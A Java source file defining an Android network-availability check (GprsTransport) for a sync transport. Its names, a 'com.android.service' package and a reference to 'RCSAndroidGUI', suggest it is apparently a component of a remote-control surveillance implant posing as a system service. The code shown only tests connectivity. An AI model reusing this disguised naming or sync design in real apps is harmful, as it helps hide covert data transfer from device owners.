/**
 * 
 */
package com.android.service.action.sync;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.android.service.Status;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTransport.
 * 
 * @author zeno
 */
public class GprsTransport extends HttpKeepAliveTransport {

	/**
	 * Instantiates a new direct transport.
	 * 
	 * @param host
	 *            the host
	 */
	public GprsTransport(final String host) {
		super(host);

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		return haveInternet();
	}

	// TODO: capire se ha senso sia con wifi che con direct
	/**
	 * Have internet.
	 * 
	 * @return true, if successful
	 */
	private boolean haveInternet() {

		final NetworkInfo info = ((ConnectivityManager) Status.getAppContext()
				.getSystemService(Context.CONNECTIVITY_SERVICE))
				.getActiveNetworkInfo();
		if (info == null || !info.isConnected()) {
			return false;
		}
		if (info.isRoaming()) {
			// here is the roaming option you can change it if you want to
			// disable internet while roaming, just return false
			return true;
		}
		return true;
	}

}
